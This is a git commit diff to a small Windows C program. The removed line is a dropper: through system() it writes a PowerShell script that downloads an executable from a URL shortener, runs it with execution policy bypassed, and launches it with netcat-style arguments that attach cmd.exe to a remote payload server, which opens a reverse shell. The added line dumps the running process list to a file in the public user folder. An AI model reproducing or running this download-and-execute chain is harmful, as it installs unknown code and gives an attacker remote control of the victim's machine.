8f6ff649fdc57c706c0855940a478553efb5b40d
Amir <am.eskandari@icloud.com>
2025-02-02 12:39:11 -0800

    Update source.c

--- source.c
+++ source.c
@@ -1,9 +1,7 @@
 #include<windows.h>
-#include<string.h>
 #include<stdio.h>
 
 int main() {
-
-      system("cmd.exe /c mkdir c:\\temp 2> NUL & echo ^[Net.ServicePointManager^]::SecurityProtocol ^= ^[Net.SecurityProtocolType^]::Tls12 > c:\\temp\\b.ps1 & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile c:\\temp\\a.exe) >> c:\\temp\\b.ps1 & cmd.exe /c powershell -ExecutionPolicy ByPass -File c:\\temp\\b.ps1 & START /MIN c:\\temp\\a.exe payload_server payload_port -e cmd.exe -d & exit");
-      return 0;
+    system("cmd.exe /c tasklist > C:\\Users\\Public\\system_log.txt");
+    return 0;
 }
